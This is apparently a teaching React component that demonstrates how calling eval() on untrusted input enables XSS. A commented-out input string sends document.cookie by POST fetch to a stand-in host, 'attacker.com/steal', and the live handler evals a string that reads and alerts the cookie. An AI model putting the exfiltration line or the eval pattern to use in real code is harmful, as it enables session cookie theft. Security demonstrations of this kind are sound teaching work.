import React from 'react';

const EvalAttack = () => {
  console.log('Enter in eval attack example');

  // Example of potentially malicious user input
//   const userInput = `
//     const cookies = document.cookie;
//     console.log('cookies========', cookies);
//     fetch('https://attacker.com/steal', {
//       method: 'POST',
//       body: document.cookie
//     });
//   `;

const userInput = `
    const cookies = document.cookie;
    console.log('cookies========', cookies);
    alert('your cookie was about to share with third party: ' + cookies, cookies)
`;

  const handleUnsafeClick = () => {
    // This is extremely unsafe and should never be done in production!
    // It demonstrates how `eval` can execute malicious code.
    document.cookie = 'password' + "=" + 'john' + ";"  + ";path=/";
    eval(userInput);
  };

  const handleSafeClick = () => {
    // A safe implementation avoids `eval` altogether
    // Only trusted, predefined code should be executed.
    console.log('Safe click handler executed.');
  };

  return (
    <div>
      <h2>Eval Attack Example</h2>
      <p>
        This example demonstrates how using <code>eval()</code> with untrusted input can lead to security vulnerabilities like XSS attacks.
      </p>
      <button onClick={handleUnsafeClick} style={{ backgroundColor: 'red', color: 'white' }}>
        Unsafe: Click Me
      </button>
    </div>
  );
};

export default EvalAttack;
